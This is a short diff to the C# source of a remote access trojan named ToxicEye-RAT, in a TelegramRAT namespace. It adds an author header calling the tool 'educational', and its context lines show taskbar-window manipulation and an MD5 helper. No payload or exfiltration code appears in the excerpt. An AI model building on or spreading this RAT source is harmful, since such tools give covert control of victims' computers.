@@ -1,4 +1,12 @@
-﻿using System;
+﻿/* 
+       ^ Author    : LimerBoy
+       ^ Name      : ToxicEye-RAT
+       ^ Github    : https:github.com/LimerBoy
+
+       > This program is distributed for educational purposes only.
+*/
+
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -497,6 +505,7 @@ namespace TelegramRAT
             IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
             SendMessageW(lHwnd, 0x111, (IntPtr)416, IntPtr.Zero);
         }
+
 
         // MD5
         public static string MD5(this string s)
